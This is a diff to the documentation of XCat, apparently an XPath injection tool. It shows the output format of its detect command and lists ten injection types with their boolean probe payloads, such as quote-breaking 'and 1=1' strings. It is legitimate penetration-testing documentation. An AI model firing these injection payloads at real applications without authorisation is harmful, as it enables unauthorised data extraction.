@@ -84,23 +84,97 @@ can use this to quickly explore an injection and different parameter values befo
 ```shell
 $ xcat detect http://localhost:4567/ query query=Rogue --true-string=Lawyer
 function call - last string parameter - single quote
- - Example: /lib/something[function(?)]
+Example: /lib/something[function(?)]
+
 Detected features:
- - xpath-2: True
- - xpath-3: False
- - xpath-3.1: False
- - normalize-space: True
- - substring-search: True
- - codepoint-search: True
- - environment-variables: False
- - document-uri: True
- - base-uri: True
- - current-datetime: True
- - unparsed-text: False
- - doc-function: True
- - linux: False
- - expath-file: False
- - saxon: False
- - oob-http: False
- - oob-entity-injection: False
+xpath-2: True
+xpath-3: False
+xpath-3.1: False
+normalize-space: True
+substring-search: True
+codepoint-search: True
+environment-variables: False
+document-uri: True
+base-uri: True
+current-datetime: True
+unparsed-text: False
+doc-function: True
+linux: False
+expath-file: False
+saxon: False
+oob-http: False
+oob-entity-injection: False
 ``` 
+
+# run
+
+
+# injections
+
+This command prints out all the injections XCat currently can use, along with the sample expressions 
+XCat will use to test if this injection works.
+
+```shell
+$ xcat injections
+Supports 10 injections:
+ - Name: integer
+   Example: /lib/book[id=?]
+   Tests:
+   - ? and 1=1 = passes
+   - ? and 1=2 = fails
+ - Name: string - single quote
+   Example: /lib/book[name='?']
+   Tests:
+   - ?' and '1'='1 = passes
+   - ?' and '1'='2 = fails
+ - Name: string - double quote
+   Example: /lib/book[name="?"]
+   Tests:
+   - ?" and "1"="1 = passes
+   - ?" and "1"="2 = fails
+ - Name: attribute name - prefix
+   Example: /lib/book[?=value]
+   Tests:
+   - 1=1 and ? = passes
+   - 1=2 and ? = fails
+ - Name: attribute name - postfix
+   Example: /lib/book[?=value]
+   Tests:
+   - ? and not 1=2 and ? = passes
+   - ? and 1=2 and ? = fails
+ - Name: element name - prefix
+   Example: /lib/something?/
+   Tests:
+   - .[true()]/? = passes
+   - .[false()]/? = fails
+ - Name: element name - postfix
+   Example: /lib/?something
+   Tests:
+   - ?[true()] = passes
+   - ?[false()] = fails
+ - Name: function call - last string parameter - single quote
+   Example: /lib/something[function(?)]
+   Tests:
+   - ?') and true() and string('1'='1 = passes
+   - ?') and false() and string('1'='1 = fails
+ - Name: function call - last string parameter - double quote
+   Example: /lib/something[function(?)]
+   Tests:
+   - ?") and true() and string("1"="1 = passes
+   - ?") and false() and string("1"="1 = fails
+ - Name: other elements - last string parameter - double quote
+   Example: /lib/something[function(?) and false()] | //*[?]
+   Tests:
+   - ?") and false()] | //*[true() and string("1"="1 = passes
+   - ?") and false()] | //*[false() and string("1"="1 = fails
+```
+
+# ip
+
+This command is a convenience function to get your current external IP address. It takes 
+no arguments.
+
+```shell
+$ xcat ip
+123.210.60.90
+```
